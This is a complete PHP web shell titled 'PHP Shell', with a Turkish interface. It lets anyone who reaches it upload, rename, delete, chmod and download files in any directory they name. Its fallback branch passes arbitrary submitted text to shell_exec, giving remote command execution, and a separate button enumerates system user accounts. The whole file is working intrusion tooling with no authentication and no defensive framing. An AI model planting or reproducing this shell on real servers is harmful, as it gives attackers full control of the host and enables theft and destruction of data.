<?php
$base_dir = __DIR__;  
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : $base_dir;

echo "<h1>PHP Shell</h1>";
echo "<h2>Geçerli dizin: $current_dir</h2>";


echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'/>";
echo "<input type='submit' name='upload' value='Dosya Yükle'/>";
echo "</form>";

// dosya yükleme
if (isset($_FILES['file'])) {
    $upload_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "Dosya başarıyla yüklendi: $upload_file<br/>";
    } else {
        echo "Dosya yükleme hatası!<br/>";
    }
}

// dosya ismi düzenleme
if (isset($_POST['rename'])) {
    $old_file_name = $current_dir . '/' . $_POST['old_file_name'];
    $new_file_name = $current_dir . '/' . $_POST['new_file_name'];
    
    if (rename($old_file_name, $new_file_name)) {
        echo "Dosya adı başarıyla değiştirildi: " . htmlspecialchars($_POST['new_file_name']) . "<br/>";
    } else {
        echo "Dosya adı değiştirilirken hata oluştu!<br/>";
    }
    
}

// dizin değiştirme
echo "<form method='get'>";
echo "<input type='text' name='dir' placeholder='Dizin girin...' value='$current_dir'/>";
echo "<input type='submit' value='Dizini Değiştir'/>";
echo "</form><hr/>";

//komut çalıştırma
echo "<form method='post'>";
echo "<input type='text' name='command' placeholder='Komut Girin..' value=''/>";
echo "<input type='submit' value='Çalıştır'/>";
echo "</form><hr/>";

// dosya arama
echo "<form method='get'>";
echo "<input type='text' name='search' placeholder='Dosya adı girin...'/>";
echo "<input type='hidden' name='dir' value='$current_dir' />";
echo "<input type='submit' value='Ara'/>";
echo "</form>";

echo "<h3>Dosya Listesi</h3>";
$files = scandir($current_dir);
$search_query = isset($_GET['search']) ? $_GET['search'] : '';

foreach ($files as $file) {
    // arama 
    if ($search_query && stripos($file, $search_query) === false) {
        continue;
    }
    
    $file_path = $current_dir . '/' . $file;
    
    // Dosya izinleri
    $permissions = substr(sprintf('%o', fileperms($file_path)), -4);
    
    echo "<form method='post' style='display:inline;'>";
    echo htmlspecialchars($file) . " (İzinler: $permissions) ";
    echo "<input type='hidden' name='file_name' value='" . htmlspecialchars($file) . "' />";
    echo "<input type='submit' name='delete' value='Sil' />";
    echo "</form>";
    
    // Düzenleme formu
    echo "<form method='post' style='display:inline;'>";
    echo "<input type='hidden' name='old_file_name' value='" . htmlspecialchars($file) . "' />";
    echo "<input type='text' name='new_file_name' placeholder='Yeni isim' />";
    echo "<input type='submit' name='rename' value='Düzenle' />";
    echo "</form><br/>";
}

echo "<hr>";


if (isset($_POST['command'])) {
    $command = $_POST['command'];

    switch ($command) {
        case 'list':
            $files = scandir($current_dir);
            foreach ($files as $file) {
                echo $file . "<br/>";
            }
            break;
        case 'help':
            echo "<p>Kullanılabilir Komutlar:</p>";
            echo "<ul>";
            echo "<li><b>list</b>: Geçerli dizindeki dosyaları listeler.</li>";
            echo "<li><b>chmod [izin]</b>: Dosya izinlerini değiştirmek için kullanılır. Örnek: chmod 0777 dosya.txt</li>";
            echo "<li><b>delete [dosya]</b>: Bir dosyayı siler.</li>";
            echo "<li><b>download [dosya]</b>: Bir dosyayı indirir.</li>";
            echo "</ul>";
            break;
        default:
            if (preg_match('/chmod (\d{3}) (.+)/', $command, $matches)) {
                $mode = intval($matches[1], 8);
                $file = $current_dir . '/' . $matches[2];
                if (chmod($file, $mode)) {
                    echo "$file için izinler değiştirildi.<br/>";
                } else {
                    echo "İzin değiştirilemedi.<br/>";
                }
            } elseif (preg_match('/delete (.+)/', $command, $matches)) {
                $file = $current_dir . '/' . $matches[1];
                if (unlink($file)) {
                    echo "$file başarıyla silindi.<br/>";
                } else {
                    echo "Silme işlemi başarısız.<br/>";
                }
            } elseif (preg_match('/download (.+)/', $command, $matches)) {
                $file = $current_dir . '/' . $matches[1];
                if (file_exists($file)) {
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                } else {
                    echo "Dosya bulunamadı.<br/>";
                }

            } else {
                //
                $output = shell_exec($command . " 2>&1");
                echo "<pre>$output</pre>";
            }
    }
}

echo "<form method='post'>";
echo "<input type='submit' name='get_users' value='etc/passwd getir' />";
echo "</form><br/>";


if (isset($_POST['get_users'])) {
    echo "<h3>etc/passwd getir</h3>";
    for ($i = 1; $i <= 2000; $i++) {
        $user_info = posix_getpwuid($i);
        if ($user_info) {
            echo "UID: " . $user_info['uid'] . " - Kullanıcı Adı: " . $user_info['name'] . "<br/>";
        }
    } }
?>